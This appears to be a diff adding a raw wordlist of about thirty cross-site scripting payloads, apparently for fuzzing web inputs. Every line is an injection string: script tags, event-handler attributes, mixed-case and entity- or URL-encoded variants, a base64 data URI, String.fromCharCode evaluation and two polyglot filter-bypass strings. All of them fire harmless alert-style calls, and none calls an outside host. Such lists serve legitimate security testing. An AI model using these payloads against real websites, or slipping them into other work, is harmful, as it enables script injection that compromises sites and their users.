@@ -1,0 +1,33 @@
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS');"></iframe>
+<details open ontoggle=alert('XSS')>
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)><source>
+<body onpageshow=alert(1)>
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1) value=1 min=0 max=2></meter>
+<object data="javascript:alert(1)"></object>
+<ScRipT>alert(1)</sCrIpT>
+<iMg sRc=x oNeRrOr=alert(1)>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>document.domain</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
+<script>alert`1`</script>
+<script>a/l/e/r/t(1)</script>
+<img src=x onerror=alert(1)<!--%00-->
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<svg onload="alert`1`">
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+" autofocus onfocus=alert(1) "
